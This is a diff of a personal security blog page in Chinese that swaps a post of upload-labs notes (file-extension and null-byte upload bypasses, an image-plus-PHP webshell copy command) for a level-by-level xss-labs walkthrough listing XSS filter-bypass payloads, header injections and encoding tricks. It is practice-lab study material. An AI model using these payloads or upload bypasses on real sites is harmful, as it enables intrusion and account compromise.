@@ -4,8 +4,9 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="upload-labs, Hyy&#39;s Blog">
-    <meta name="description" content="upload-labs1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556参考	htt">
+    <meta name="keywords" content="xss-labs, Hyy&#39;s Blog">
+    <meta name="description" content="xss-labs
+1234567891011121314151617181920/*	重写alert函数去完成跳转	script是javascript的意思 &amp;lt;script&amp;gt;&amp;lt;/script&amp;gt;不能插在h2标签里面	h">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -17,7 +18,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>upload-labs | Hyy&#39;s Blog</title>
+    <title>xss-labs | Hyy&#39;s Blog</title>
     <link rel="icon" type="image/png" href="/favicon.png">
     
 
@@ -312,12 +313,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/2.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/11.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">upload-labs</h1>
+                    <h1 class="description center-align post-title">xss-labs</h1>
                 </div>
             </div>
         </div>
@@ -353,7 +354,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2023-07-20
+                    2023-07-25
                 </div>
                 
 
@@ -374,9 +375,60 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="upload-labs"><a href="#upload-labs" class="headerlink" title="upload-labs"></a>upload-labs</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">参考</span><br><span class="line">	https://blog.csdn.net/weixin_47598409/article/details/115050869</span><br><span class="line"></span><br><span class="line">pass01 前端验证</span><br><span class="line">pass02 Content-type:image/png</span><br><span class="line">pass03 黑名单 php3 php5 phtml</span><br><span class="line">	httpd.conf 添加AddType application/x-httpd-php .php .phtml .php5 .php3</span><br><span class="line">		去掉#</span><br><span class="line">pass04 </span><br><span class="line">	Apache启用AllowOverride None--&gt;All .htaccess</span><br><span class="line">	SetHandler application/x-httpd-php</span><br><span class="line">	一句话木马加上GIF89a</span><br><span class="line">pass05</span><br><span class="line">	</span><br><span class="line">pass06</span><br><span class="line">	大小绕过 .Php</span><br><span class="line">pass07</span><br><span class="line">	xxx.php (此处有个空格)</span><br><span class="line">pass08</span><br><span class="line">	xxx.php.</span><br><span class="line">pass09</span><br><span class="line">	xxx.php::$DATA</span><br><span class="line">pass10</span><br><span class="line">	xxx.php. .</span><br><span class="line">pass11</span><br><span class="line">	xxx.phphpp</span><br><span class="line">pass12</span><br><span class="line">	需要php版本&lt;5.3.4 且magic_quotes_gpc关闭</span><br><span class="line">	xxx.php%00</span><br><span class="line">pass13</span><br><span class="line">	post %00截断</span><br><span class="line">	post不会对里面的数据自动接码 需要在Hex中修改</span><br><span class="line">	先写个➕号后面用hex模式改</span><br><span class="line">pass14</span><br><span class="line">	图片码➕文件包含</span><br><span class="line">	补充知识：</span><br><span class="line">        1.Png图片文件包括8字节：89 50 4E 47 0D 0A 1A 0A。即为 .PNG。</span><br><span class="line">        2.Jpg图片文件包括2字节：FF D8。</span><br><span class="line">        3.Gif图片文件包括6字节：47 49 46 38 39|37 61 。即为 GIF89(7)a。</span><br><span class="line">        4.Bmp图片文件包括2字节：42 4D。即为 BM。</span><br><span class="line">    cmd---&gt;&gt;&gt;copy 777.png/b + xxx.php pass14.png</span><br><span class="line">pass15</span><br><span class="line">	getimagesize()检查是否为图片文件</span><br><span class="line">	仍然可以用14关方法</span><br><span class="line">pass16</span><br><span class="line">	</span><br><span class="line">pass17</span><br><span class="line">	</span><br><span class="line">pass18</span><br><span class="line">	</span><br><span class="line">pass19</span><br><span class="line">	</span><br><span class="line">pass20</span><br><span class="line">	</span><br><span class="line">pass21</span><br><span class="line">	</span><br></pre></td></tr></table></figure>
+                <h1 id="xss-labs"><a href="#xss-labs" class="headerlink" title="xss-labs"></a>xss-labs</h1><p><img src="/2023/07/25/xss-labs/1679368013327.png" alt="1679368013327"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">	重写alert函数去完成跳转</span></span><br><span class="line"><span class="comment">	script是javascript的意思 &lt;script&gt;&lt;/script&gt;不能插在h2标签里面</span></span><br><span class="line"><span class="comment">	htmlspecialchars</span></span><br><span class="line"><span class="comment">        &amp;（和号） 成为&amp;amp;</span></span><br><span class="line"><span class="comment">        &quot; （双引号） 成为 &amp;quot;</span></span><br><span class="line"><span class="comment">        &#x27; （单引号） 成为 &amp;apos;</span></span><br><span class="line"><span class="comment">        &lt; （小于） 成为 &amp;lt;</span></span><br><span class="line"><span class="comment">        &gt; （大于） 成为 &amp;gt;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">// payload</span></span><br><span class="line"><span class="comment">// 1	显示在页面上出了可能有sql注入也可能是xss</span></span><br><span class="line">&lt;script&gt;<span class="title function_ invoke__">alert</span>(<span class="number">1</span>)&lt;/script&gt;</span><br><span class="line"><span class="comment">// 2	&lt;input name=keyword  value=&quot;&#x27;.$str.&#x27;&quot;&gt;</span></span><br><span class="line"><span class="string">&quot;&gt; &lt;script&gt;alert(1)&lt;/script&gt;</span></span><br><span class="line"><span class="string">&quot;</span>&gt; &lt;img src=<span class="string">&#x27;666&#x27;</span> onerror=<span class="title function_ invoke__">alert</span>()&gt; &lt;<span class="string">&quot;</span></span><br><span class="line"><span class="string">&quot;</span>&gt; &lt;img src=<span class="number">666</span> onmouseout=<span class="string">&quot;alert()&quot;</span>&gt; &lt;<span class="string">&quot;	#鼠标移出图片</span></span><br><span class="line"><span class="string">&quot;</span>&gt; &lt;img src=<span class="number">1</span> onmouseover=<span class="string">&quot;alert()&quot;</span>&gt; &lt;<span class="string">&quot; 	#鼠标移动到图片</span></span><br><span class="line"><span class="string">// 利用iframe标签，插入一个标签data:text/html;base64, 将后面的内容进行base64解码，PHNjcmlwdD5hbGVydCgpPC9zY3JpcHQ+进行base64解码后是&lt;script&gt;alert(1)&lt;/script&gt;</span></span><br><span class="line"><span class="string">&quot;</span>&gt; &lt;iframe src=<span class="string">&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgpPC9zY3JpcHQ+&quot;</span>&gt; &lt;<span class="string">&quot;</span></span><br></pre></td></tr></table></figure>
 
-<h1 id><a href="#" class="headerlink" title></a></h1>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">3</span>	&lt;input name=keyword value=<span class="string">&#x27;&quot;.htmlspecialchars($str).&quot;&#x27;</span>&gt;		此处好像对单双引号没用</span><br><span class="line"><span class="string">&#x27; onclick=alert(1) &#x27;</span>			再单击输入框</span><br><span class="line"><span class="string">&#x27; onfocus=alert(1) &#x27;</span></span><br><span class="line">&lt;input name=<span class="string">&quot;keyword&quot;</span> value=<span class="string">&quot;&quot;</span> onfocus=<span class="string">&quot;alert(1)&quot;</span> <span class="string">&#x27;&#x27;</span>=<span class="string">&quot;&quot;</span>&gt;		根据显示的把内容不能判断闭合的条件，得猜	<span class="title function_ invoke__">alert</span>(<span class="number">1</span>)	被自己加上了</span><br><span class="line"><span class="string">&#x27; onfocus=javascript:alert(1) &#x27;</span></span><br><span class="line"><span class="string">&#x27;onfocus=javascript:alert(1) &#x27;</span>		前面的空格可以少 后面的不可以</span><br><span class="line">反推	一定先闭合单引号	html前端显示	</span><br><span class="line">&lt;input name=<span class="string">&quot;keyword&quot;</span> value=<span class="string">&quot;&quot;</span> onfocus=<span class="string">&quot;javascript:alert(1)&quot;</span> <span class="string">&#x27;&#x27;</span>=<span class="string">&quot;&quot;</span>&gt;</span><br><span class="line"><span class="number">4</span>	</span><br><span class="line"><span class="string">&#x27; onclick=alert(1) &#x27;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/2023/07/25/xss-labs/1679382262224.png" alt="1679382262224"></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">5</span><br><span class="line">&quot; &gt;<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">alert(1)</span>&gt;</span>hyy<span class="tag">&lt;/<span class="name">a</span>&gt;</span> &lt;&quot;				这个不行</span><br><span class="line">&quot; &gt;<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">javascript:alert(1)</span>&gt;</span>hyy<span class="tag">&lt;/<span class="name">a</span>&gt;</span> &lt;&quot;			单机hyy</span><br><span class="line">    </span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">level5.php</span> <span class="attr">method</span>=<span class="string">GET</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">keyword</span>  <span class="attr">value</span>=<span class="string">&quot;&quot;</span> &gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">javascript:alert(1)</span>&gt;</span>hyy<span class="tag">&lt;/<span class="name">a</span>&gt;</span> &lt;&quot;&quot;&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">submit</span> <span class="attr">name</span>=<span class="string">submit</span> <span class="attr">value</span>=<span class="string">搜索</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/07/25/xss-labs/1679382601984.png" alt="1679382601984"></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">6</span><br><span class="line">&quot; &gt;<span class="tag">&lt;<span class="name">a</span> <span class="attr">hRef</span>=<span class="string">javascript:alert(1)</span>&gt;</span>hyy<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">keyword</span>  <span class="attr">value</span>=<span class="string">&quot;&quot;</span> &gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">hRef</span>=<span class="string">javascript:alert(1)</span>&gt;</span>hyy<span class="tag">&lt;/<span class="name">a</span>&gt;</span>&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/07/25/xss-labs/1679383527123.png" alt="1679383527123"></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">7	小写+删除特殊字符</span><br><span class="line">双写在script href上！</span><br><span class="line">&quot; &gt;<span class="tag">&lt;<span class="name">a</span> <span class="attr">hRhRefef</span>=<span class="string">javascscriptript:alert(1)</span>&gt;</span>hyy<span class="tag">&lt;/<span class="name">a</span>&gt;</span>		</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/07/25/xss-labs/1679384428934.png" alt="1679384428934"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//8	小写+替换特殊字符</span></span><br><span class="line"><span class="comment">//测试字符</span></span><br><span class="line"><span class="string">&quot; src data onfocus &lt;script&gt;&lt;/script&gt; &lt;a href=javascript:alert()&gt;</span></span><br><span class="line"><span class="string">//&quot;</span></span><br><span class="line"><span class="comment">//变成这样</span></span><br><span class="line">&lt;a href=<span class="string">&quot;&amp;quot sr_c da_ta o_nfocus &lt;scr_ipt&gt;&lt;/scr_ipt&gt; &lt;a hr_ef=javascr_ipt:alert()&gt;&quot;</span>&gt;友情链接&lt;/a&gt;</span><br><span class="line"><span class="comment">//js伪协议		javascript:alert()</span></span><br><span class="line"><span class="comment">//转unicode	编码	https://www.matools.com/code-convert-unicode</span></span><br><span class="line">&amp;<span class="comment">#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;</span></span><br><span class="line"><span class="comment">// 我的总结</span></span><br><span class="line">    burpsuite 发送返回包都是ascii</span><br><span class="line">    php没有内置的unicode解码函数</span><br><span class="line">    http解析器设置了&lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;	仍然能解析unicode编码	编了码所以绕过了基于php的过滤</span><br><span class="line">    关于编码</span><br><span class="line">    	<span class="number">1</span>.ASCII --<span class="number">1</span>字节</span><br><span class="line">		<span class="number">2</span>.UNICODE --<span class="number">2</span>字节</span><br><span class="line">		<span class="number">3</span>.GBK --<span class="number">2</span>字节和<span class="number">1</span>字节混用，表示中文，字符在<span class="number">127</span>以下，用<span class="number">1</span>字节，字符在<span class="number">127</span>以上就是标识汉字。</span><br><span class="line">    	<span class="number">4</span>.UTF-<span class="number">8</span>是Unicode的实现方式之一</span><br><span class="line">    		UTF-<span class="number">8</span>最大的一个特点，就是它是一种变长的编码方式。它可以使用<span class="number">1</span>~<span class="number">4</span>个字节表示一个符号，根据不同的符号而变化字节长度。</span><br><span class="line"><span class="comment">// 也可能是		href属性自动解析Unicode编码</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/07/25/xss-labs/1679461236031.png" alt="1679461236031"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//	9</span></span><br><span class="line">&amp;<span class="comment">#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#41;/* http:// */</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 10	删除&lt;&gt;</span></span><br><span class="line">经过测试最下面的hidden type可以造成xss</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/07/25/xss-labs/1679466741163.png" alt="1679466741163"></p>
+<p><img src="/2023/07/25/xss-labs/1679466853887.png" alt="1679466853887"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 11</span></span><br><span class="line">Referer: <span class="string">&quot; onclick=javascript:alert(1)&gt; &quot;</span></span><br><span class="line">抓包改了发</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/07/25/xss-labs/1679476852892.png" alt="1679476852892"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 12</span></span><br><span class="line">User-Agent: <span class="string">&quot; onclick=javascript:alert(1) &quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 13</span></span><br><span class="line">Cookie: user=<span class="string">&quot; onclick=javascript:alert(1) &quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 14	这关网站挂了	上传具备xss属性的图片</span></span><br><span class="line">https:<span class="comment">//www.freebuf.com/articles/web/282983.html</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 15</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">	ng-include指令用于包含外部的HTML文件</span></span><br><span class="line"><span class="comment">	包含内容将作为指定元素的子节点</span></span><br><span class="line"><span class="comment">	默认情况下，包含的文件需要在同一个域名下</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">http:<span class="comment">//192.168.56.1/xss-labs/level15.php?src=%27http://192.168.56.1/xss-labs/level1.php?name=%3Cimg%20src=666%20onerror=alert(1)%3E%27</span></span><br><span class="line">http:<span class="comment">//192.168.56.1/xss-labs/level15.php?src=%22http://192.168.56.1/xss-labs/level1.php?name=%3Cimg%20src=666%20onerror=alert(1)%3E%22</span></span><br><span class="line">网址的单双引号不影响</span><br><span class="line">很奇怪&lt;script&gt;<span class="title function_ invoke__">alert</span>(<span class="number">1</span>)&lt;/script&gt;		不知道为什么不行</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/07/25/xss-labs/1679480916203.png" alt="1679480916203"></p>
+<p><img src="/2023/07/25/xss-labs/1679480983356.png" alt="1679480983356"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 16 替换script 空格 / </span></span><br><span class="line">&lt;a%<span class="number">0</span>D%<span class="number">0</span>Aonclick=<span class="string">&#x27;alert(1)&#x27;</span>&gt; 需要下一行有东西就可以点 这应该算代码缺陷正常来说&lt;a ..&gt;hyy19sec&lt;/a&gt;</span><br><span class="line">自己构造</span><br><span class="line">&lt;a%<span class="number">0</span>Aonclick=<span class="string">&#x27;alert(1)&#x27;</span>&gt;&lt;img%<span class="number">0</span>Asrc=<span class="string">&quot;http://127.0.0.1&quot;</span>&gt;</span><br><span class="line">&lt;img%<span class="number">0</span>Asrc=<span class="number">666</span>%<span class="number">0</span>Aonerror=<span class="title function_ invoke__">alert</span>(<span class="number">1</span>)&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/07/25/xss-labs/image-20230403121011962.png" alt="image-20230403121011962"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 17</span></span><br><span class="line">http:<span class="comment">//1.117.139.173/xss-labs/level17.php?arg01=a&amp;arg02=1%20onmousedown=%27alert(1)%27</span></span><br><span class="line">谷歌浏览器edge浏览器可以 firefox不行</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/07/25/xss-labs/image-20230403135834611.png" alt="image-20230403135834611"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 18</span></span><br><span class="line">同<span class="number">17</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/07/25/xss-labs/image-20230403141137098.png" alt="image-20230403141137098"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 19		flash版本问题 应该不好使了</span></span><br><span class="line">https:<span class="comment">//baynk.blog.csdn.net/article/details/103213877</span></span><br><span class="line">?arg01=version&amp;arg02=&lt;a%<span class="number">20</span>href=<span class="string">&quot;javascript:alert(/xss/)&quot;</span>&gt;xss&lt;/a&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/07/25/xss-labs/image-20230403141316143.png" alt="image-20230403141316143"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 20		....先不写了		17-20 xsf01-04</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id><a href="#" class="headerlink" title></a><img src="/2023/07/25/xss-labs/image-20230403142750363.png" alt="image-20230403142750363"></h2>
                 
             </div>
             <hr/>
@@ -402,7 +454,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://huyaoyao2019.github.io/2023/07/20/upload-labs/">http://huyaoyao2019.github.io/2023/07/20/upload-labs/</a>
+                    <a href="http://huyaoyao2019.github.io/2023/07/25/xss-labs/">http://huyaoyao2019.github.io/2023/07/25/xss-labs/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -520,13 +572,13 @@
             <div class="article-badge left-badge text-color">
                 <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/2023/07/25/xss-labs/">
+                <a href="/2023/07/25/sqli-labs/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/11.jpg" class="responsive-img" alt="xss-labs">
+                        <img src="/medias/featureimages/16.jpg" class="responsive-img" alt="sqli-labs">
                         
-                        <span class="card-title">xss-labs</span>
+                        <span class="card-title">sqli-labs</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -557,13 +609,13 @@
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2023/07/20/%E4%B8%80%E4%BA%9B%E7%9F%A5%E8%AF%86%E7%82%B9/">
+                <a href="/2023/07/20/upload-labs/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/5.jpg" class="responsive-img" alt="一些知识点">
+                        <img src="/medias/featureimages/2.jpg" class="responsive-img" alt="upload-labs">
                         
-                        <span class="card-title">一些知识点</span>
+                        <span class="card-title">upload-labs</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
